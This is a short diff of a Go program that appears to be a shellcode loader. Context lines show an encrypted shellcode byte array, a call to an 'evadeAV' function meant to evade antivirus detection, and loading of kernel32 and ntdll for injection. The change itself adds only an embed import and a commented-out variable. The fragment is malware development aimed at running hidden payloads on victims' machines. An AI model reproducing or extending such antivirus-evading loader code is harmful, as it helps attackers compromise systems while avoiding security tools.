@@ -4,6 +4,7 @@ package main
 import (
 	"crypto/aes"
 	"crypto/cipher"
+	_ "embed"
 	"fmt"
 	"syscall"
 	"time"
@@ -143,6 +144,8 @@ var shellcode = []byte{0x06, 0xB8, 0xBC, 0x00, 0x80, 0xCC, 0x2C, 0x1D, 0xC4, 0xE
 func main() {
 	// Call the evadeAV function to evade AV detection
 	evadeAV()
+
+	//var faciconBytes []byte
 
 	// Instantiate the kernel32 and ntdll DLLs
 	kernel32 := syscall.NewLazyDLL("kernel32.dll")
